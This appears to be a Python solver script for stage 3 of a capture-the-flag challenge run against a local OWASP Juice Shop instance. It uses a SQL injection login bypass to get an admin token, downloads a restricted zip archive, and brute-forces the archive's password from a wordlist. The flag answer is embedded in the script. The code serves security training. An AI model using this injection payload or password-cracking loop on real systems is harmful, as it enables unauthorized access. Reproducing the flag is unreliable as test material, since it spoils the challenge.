#!/usr/bin/env python3
"""
Stage 3 Solver - Cryptography & Archive Password Recovery
1. Authenticates to OWASP Juice Shop as Admin (Adrian Kessler).
2. Verifies that evidence archive is restricted to administrators (401/403 for non-admins).
3. Downloads evidence_photos.zip using the Admin privilege.
4. Cracks evidence_photos.zip using wordlist.txt to recover Adrian Kessler's master password.
Flag: Kessler123! or uninvited{Kessler123!}
"""

import os
import zipfile
import requests

def solve():
    script_dir = os.path.dirname(os.path.abspath(__file__))
    stage3_dir = os.path.join(script_dir, '..', 'stages', 'stage3_crypto')
    local_zip_path = os.path.join(stage3_dir, 'evidence_photos.zip')
    wordlist_path = os.path.join(stage3_dir, 'wordlist.txt')

    print("[*] Step 1: Testing Juice Shop Administrator Evidence Download...")
    base_url = 'http://localhost:3000'
    dl_url = f'{base_url}/rest/admin/evidence_photos.zip'

    # Check unauthenticated access is blocked
    r_unauth = requests.get(dl_url, timeout=5)
    print(f"    - Unauthenticated request: HTTP {r_unauth.status_code} ({r_unauth.json().get('error', '')[:40]}...)")

    # Authenticate as Adrian Kessler (Admin) using SQL injection bypass
    login_url = f'{base_url}/rest/user/login'
    login_data = {'email': "adrian.kessler@uninvited.local'--", 'password': 'test'}
    r_login = requests.post(login_url, json=login_data, timeout=5)
    
    zip_bytes = None
    if r_login.status_code == 200:
        token = r_login.json().get('authentication', {}).get('token')
        print(f"[+] Admin session authenticated! Downloading from Juice Shop...")
        r_dl = requests.get(dl_url, headers={'Authorization': f'Bearer {token}'}, timeout=5)
        if r_dl.status_code == 200:
            print(f"[+] Successfully downloaded evidence_photos.zip ({len(r_dl.content)} bytes) using Admin privilege!")
            zip_bytes = r_dl.content
            # Save to local file
            with open(local_zip_path, 'wb') as f:
                f.write(zip_bytes)

    if not os.path.exists(local_zip_path):
        print(f"[-] Could not find or download evidence_photos.zip")
        return None

    print(f"\n[*] Step 2: Attacking encrypted archive: {local_zip_path}")
    print(f"[*] Wordlist: {wordlist_path}")

    with open(wordlist_path, 'r', encoding='utf-8', errors='ignore') as f:
        passwords = [line.strip() for line in f if line.strip()]

    print(f"[*] Loaded {len(passwords)} candidate passwords.")

    with zipfile.ZipFile(local_zip_path) as z:
        for pwd in passwords:
            try:
                test_file = z.namelist()[0]
                content = z.read(test_file, pwd=pwd.encode('utf-8'))
                
                flag_clean = pwd
                flag_wrapped = f"uninvited{{{pwd}}}"
                print(f"\n[SUCCESS] Stage 3 Solved!")
                print(f"[+] Decrypted '{test_file}' successfully.")
                print(f"Target Password: {flag_clean}")
                print(f"Flag (Standard): {flag_clean}")
                print(f"Flag (CTF format): {flag_wrapped}")
                return flag_clean
            except Exception:
                continue

    print("[-] Password not found in wordlist.")
    return None

if __name__ == '__main__':
    solve()
